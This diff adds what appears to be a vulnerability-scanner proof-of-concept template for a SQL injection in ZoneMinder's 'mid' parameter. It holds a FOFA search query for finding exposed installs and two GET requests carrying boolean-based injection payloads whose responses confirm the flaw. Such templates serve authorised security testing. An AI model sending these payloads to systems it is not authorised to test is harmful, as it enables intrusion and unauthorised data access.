@@ -1,0 +1,21 @@
+id: poc-yaml-zoneminder-zm-index-mid-sqli
+info:
+  name: ZoneMinder mid参数存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: zoneminder
+  fofa: body="ZoneMinder Login"
+requests:
+- method: GET
+  path: /zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000323&order=desc&request=watch&sort=Id&view=request
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\":\\\"Ok\\\"\"\
+    ) &&\ncontains(body,\"\\\"rows\\\":[]\")\n"
+- method: GET
+  path: /zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\":\\\"Ok\\\"\"\
+    ) &&\ncontains(body,\"\\\"rows\\\":[{\\\"Id\\\"\") &&\ncontains(body,\"MonitorId\"\
+    ) &&\ncontains(body,\"StorageId\") &&\ncontains(body,\"imgHtml\") &&\ncontains(headers,\"\
+    application/json\")\n"
+variables: {}
+transport: http
